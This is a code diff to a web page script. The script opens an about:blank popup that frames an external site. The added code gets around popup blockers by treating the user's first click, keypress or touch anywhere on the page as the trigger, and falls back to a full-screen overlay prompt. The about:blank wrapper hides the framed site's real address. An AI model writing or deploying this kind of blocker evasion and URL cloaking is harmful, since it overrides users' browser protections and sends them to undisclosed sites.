@@ -25,27 +25,85 @@
         (function(){
             const external = 'https://foreverkyx.lavipet.info/';
             let popup;
+            let opened = false;
+            const gestureEvents = ['click','keydown','touchstart','pointerdown'];
+            let overlay;
+
+            function writePopupContent(win){
+                const doc = win.document;
+                const html = `<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Popup</title><style>html,body{height:100%;margin:0}iframe{width:100%;height:100%;border:0}</style></head><body><iframe src="${external}" sandbox="allow-scripts allow-forms allow-same-origin allow-popups"></iframe></body></html>`;
+                doc.open(); doc.write(html); doc.close();
+            }
 
             function openPopup(){
+                if(opened) return;
+                opened = true;
+                // Try to open a popup window
                 popup = window.open('about:blank', '_blank', 'width=1000,height=700');
                 if(!popup){
                     console.warn('Popup blocked by browser');
-                    return;
+                    showOverlay();
+                    return false;
                 }
-                const doc = popup.document;
-                const html = `<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Popup</title><style>html,body{height:100%;margin:0}iframe{width:100%;height:100%;border:0}</style></head><body><iframe src="${external}" sandbox="allow-scripts allow-forms allow-same-origin allow-popups"></iframe></body></html>`;
-                doc.open();
-                doc.write(html);
-                doc.close();
-                try{ popup.focus(); }catch(e){}
+                try{
+                    writePopupContent(popup);
+                    popup.focus();
+                }catch(e){
+                    console.warn('Error writing popup content', e);
+                }
+                hideOverlay();
+                removeGestureListeners();
+                return true;
             }
 
-            window.addEventListener('load', () => {
-                // Try to open popup on load; browsers may block this depending on settings
+            function addGestureListeners(){
+                gestureEvents.forEach(ev => window.addEventListener(ev, onFirstGesture, {passive:true}));
+            }
+
+            function removeGestureListeners(){
+                gestureEvents.forEach(ev => window.removeEventListener(ev, onFirstGesture));
+            }
+
+            function onFirstGesture(){
+                // Called on the first real user interaction — reliably allowed to open popups
                 openPopup();
+            }
+
+            function createOverlay(){
+                overlay = document.createElement('div');
+                overlay.style.position = 'fixed';
+                overlay.style.inset = '0';
+                overlay.style.display = 'none';
+                overlay.style.alignItems = 'center';
+                overlay.style.justifyContent = 'center';
+                overlay.style.background = 'rgba(0,0,0,0.6)';
+                overlay.style.zIndex = 9999;
+                overlay.innerHTML = `<div style="color:#fff;text-align:center;font-family:sans-serif"><p style="font-size:18px;margin:0 0 12px">Click to open the content in a popup</p><button id="__open_popup_btn" style="padding:10px 16px;font-size:16px;cursor:pointer">Open</button></div>`;
+                document.body.appendChild(overlay);
+                const btn = document.getElementById('__open_popup_btn');
+                btn.addEventListener('click', (e)=>{ e.preventDefault(); openPopup(); });
+            }
+
+            function showOverlay(){
+                if(!overlay) createOverlay();
+                overlay.style.display = 'flex';
+                overlay.style.flexDirection = 'column';
+            }
+
+            function hideOverlay(){
+                if(overlay) overlay.style.display = 'none';
+            }
+
+            // Try to open on load (will often be blocked by popup blockers)
+            window.addEventListener('load', ()=>{
+                try{ openPopup(); }catch(e){ console.warn(e); }
+                // Also prepare gesture listeners — the first user gesture is the most reliable opener
+                addGestureListeners();
+                // Create overlay but keep it hidden unless needed
+                createOverlay();
             });
 
-            // Expose a function for user interaction (fallback if auto-open is blocked)
+            // Expose a manual opener for console or fallback UI
             window.openAboutBlankPopup = openPopup;
         })();
     </script>
